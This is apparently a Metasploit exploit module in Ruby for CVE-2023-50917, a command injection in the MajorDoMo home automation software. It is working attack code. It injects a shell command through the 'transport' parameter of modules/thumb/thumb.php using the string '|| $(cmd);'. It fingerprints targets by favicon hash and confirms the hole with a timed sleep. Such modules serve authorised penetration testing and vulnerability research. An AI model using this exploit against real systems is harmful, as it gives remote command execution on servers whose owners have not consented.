##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MajorDoMo Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in MajorDoMo
          versions before 0662e5e.
        },
        'Author' => [
          'Valentin Lobstein', # Vulnerability discovery and Metasploit Module
          'smcintyre-r7', # Assistance
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-50917'],
          ['URL', 'https://github.com/Chocapikk/CVE-2023-50917'],
          ['URL', 'https://chocapikk.com/posts/2023/cve-2023-50917'],
          ['URL', 'https://github.com/sergejey/majordomo'] # Vendor URL
        ],
        'DisclosureDate' => '2023-12-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'Privileged' => false
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'The URI path to MajorDoMo', '/']),
    ])
  end

  def execute_command(cmd)
    send_request_cgi(
      'uri' => normalize_uri(datastore['TARGETURI'], 'modules', 'thumb', 'thumb.php'),
      'method' => 'GET',
      'vars_get' => {
        'url' => Rex::Text.encode_base64('rtsp://'),
        'debug' => '1',
        'transport' => "|| $(#{cmd});"
      }
    )
  end

  def exploit
    execute_command(payload.encoded)
  end

  def check
    print_status("Checking if #{peer} can be exploited!")
    res = send_request_cgi(
      'uri' => normalize_uri(datastore['TARGETURI'], 'favicon.ico'),
      'method' => 'GET'
    )

    unless res && res.code == 200
      return CheckCode::Unknown('Did not receive a response from target.')
    end

    unless Rex::Text.md5(res.body) == '08d30f79c76f124754ac6f7789ca3ab1'
      return CheckCode::Safe('The target is not MajorDoMo.')
    end

    print_good('Target is identified as MajorDoMo instance')
    sleep_time = rand(5..10)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end
    print_status("Elapsed time: #{elapsed_time} seconds.")
    unless res && elapsed_time >= sleep_time
      return CheckCode::Safe('Failed to test command injection.')
    end

    CheckCode::Vulnerable('Successfully tested command injection.')
  end
end
